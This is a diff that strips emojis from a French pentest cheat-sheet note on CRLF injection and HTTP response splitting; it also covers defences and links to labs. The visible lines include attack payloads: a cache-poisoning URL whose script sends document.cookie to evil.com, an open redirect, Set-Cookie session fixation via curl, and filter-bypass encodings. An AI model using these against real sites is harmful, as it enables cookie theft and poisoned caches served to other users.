@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# ↩️ CRLF Injection — HTTP Response Splitting
+# ↩CRLF Injection — HTTP Response Splitting
 
 > [!info] **En 1 phrase**
 > CRLF Injection = injecter des caractères **`\r\n`** (CR + LF) dans une entrée reflétée dans un **en-tête HTTP**
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -36,7 +36,7 @@ flowchart LR
     F --> H[Cache poisoning]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > En HTTP, une ligne d'en-tête se termine par **CRLF** (`\r\n`, décodé depuis `%0d%0a`). Si l'app
 > reflète une entrée utilisateur dans un en-tête **sans assainir** les retours à la ligne, on peut
 > « fermer » l'en-tête courant et en **fabriquer de nouveaux**. Un double CRLF `\r\n\r\n` ferme la
@@ -44,7 +44,7 @@ flowchart LR
 
 ---
 
-## 🧱 Le mécanisme
+## Le mécanisme
 
 | Élément | Détail |
 |---|---|
@@ -64,7 +64,7 @@ flowchart LR
 
 ---
 
-## 💉 Payloads de base
+## Payloads de base
 
 ### Session Fixation — injecter un `Set-Cookie`
 
@@ -121,7 +121,7 @@ Content-Length: 34
 
 ---
 
-## 🔥 Escalade XSS
+## Escalade XSS
 
 > Deux angles : injecter **dans un en-tête** (désactiver X-XSS-Protection + body) ou **réécrire le corps**.
 
@@ -142,7 +142,7 @@ X-XSS-Protection:0            ← désactivé
 0
 ```
 
-> [!warning] ⚠️ `X-XSS-Protection:0` ne sert plus sur les navigateurs modernes, mais l'injection
+> [!warning] `X-XSS-Protection:0` ne sert plus sur les navigateurs modernes, mais l'injection
 > de corps, elle, marche toujours : le payload `<svg onload=...>` est rendu par le navigateur.
 
 ### XSS via en-tête reflété (classique, ex. header reflété)
@@ -164,7 +164,7 @@ X-XSS-Protection:0            ← désactivé
 
 ---
 
-## ↩️ Open Redirect via `Location`
+## ↩Open Redirect via `Location`
 
 ```url
 https://exemple.com/redirect?url=/accueil%0d%0aLocation:%20https://evil.com
@@ -181,7 +181,7 @@ Location: https://evil.com    ← le dernier Location gagne → redirect vers ev
 
 ---
 
-## 🧊 Cache Poisoning / Web Cache Deception
+## Cache Poisoning / Web Cache Deception
 
 > Le CRLF peut **polluer un cache** (CDN, reverse proxy) : la réponse forgée est stockée et
 > **servie à tous les utilisateurs** de la même URL-clé.
@@ -197,12 +197,12 @@ Location: https://evil.com    ← le dernier Location gagne → redirect vers ev
 https://exemple.com/profile?format=json%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>document.location='https://evil.com/'+document.cookie</script>
 ```
 
-> [!warning] ⚠️ Tester **en environnement contrôlé uniquement** : le poison reste actif un certain
+> [!warning] Tester **en environnement contrôlé uniquement** : le poison reste actif un certain
 > temps et touche **tous les utilisateurs** du cache partagé.
 
 ---
 
-## 🚫 Bypass de filtres (encodages)
+## Bypass de filtres (encodages)
 
 | Variante | Payload | Pourquoi ça peut passer |
 |---|---|---|
@@ -216,13 +216,13 @@ https://exemple.com/profile?format=json%0d%0aContent-Type: text/html%0d%0a%0d%0a
 | Null byte | `%00%0d%0a` | Un filtre `strstr("%0d%0a")` casse parfois sur `%00` |
 | Mélange | `%0a%0d` | Certains parsers acceptent l'ordre inversé |
 
-> [!tip] 💡 **Règle** : si le serveur fait **plusieurs passes de décodage** (URL → unicode → UTF-8),
+> [!tip] **Règle** : si le serveur fait **plusieurs passes de décodage** (URL → unicode → UTF-8),
 > chaque passe peut reformer `%0d%0a` et permettre un CRLF à l'étape suivante. Tester systématiquement
 > les casse et les niveaux d'encodage.
 
 ---
 
-## 🎯 Contextes d'injection
+## Contextes d'injection
 
 | Contexte | Vecteur | Résultat |
 |---|---|---|
@@ -236,7 +236,7 @@ https://exemple.com/profile?format=json%0d%0aContent-Type: text/html%0d%0a%0d%0a
 
 ---
 
-## 🛠️ Outils
+## Outils
 
 ### Burp Suite
 
@@ -264,12 +264,12 @@ curl -i -H "X-Forwarded-For: 1.2.3.4%0d%0aSet-Cookie: admin=true" https://exempl
 curl -i "https://exemple.com/?url=/cible"$'\r\n'"Location: https://evil.com"
 ```
 
-> [!warning] ⚠️ `curl` et `nc` envoient les octets bruts : vérifier que le payload n'est pas mangé
+> [!warning] `curl` et `nc` envoient les octets bruts : vérifier que le payload n'est pas mangé
 > par le terminal ou les quotes. Préférer l'encodage `%0d%0a` pour la précision.
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Mesure | Détail |
 |---|---|
@@ -285,15 +285,15 @@ curl -i "https://exemple.com/?url=/cible"$'\r\n'"Location: https://evil.com"
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Méthodologie**
+> [!tip] **Méthodologie**
 > 1. Identifier un **paramètre/header reflété** dans une réponse.
 > 2. Tester `%0d%0a` + un marqueur (`X-Test: 1`) → visible dans les en-têtes de réponse = injectable.
 > 3. Escalader : Set-Cookie → Location → double CRLF → corps → XSS → cache.
 > 4. Tester les **deux casse** (`%0d%0a` et `%0D%0A`) et le **double encodage** `%250d%250a`.
 
-> [!warning] ⚠️ **Pièges classiques**
+> [!warning] **Pièges classiques**
 > - `%0d%0a` **encodé une seule fois est décodé par le serveur** → un filtre qui bloque `%0d%0a`
 >   ne bloque rien si le serveur ré-encode/décode en plusieurs passes (`%250d%250a`).
 > - Le shell/terminal **interprète** `\r\n` → encoder en `%0d%0a` pour des tests fiables.
@@ -304,11 +304,11 @@ curl -i "https://exemple.com/?url=/cible"$'\r\n'"Location: https://evil.com"
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[Open Redirect|↩️ Open Redirect]]
-- [[HTTP Request Smuggling|🚂 Smuggling]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md)
-- 🧪 Labs : [PortSwigger — HTTP/2 request splitting via CRLF](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection) · [Root-Me — CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[Open Redirect|↩Open Redirect]]
+- [[HTTP Request Smuggling| Smuggling]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md)
+- Labs : [PortSwigger — HTTP/2 request splitting via CRLF](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection) · [Root-Me — CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)
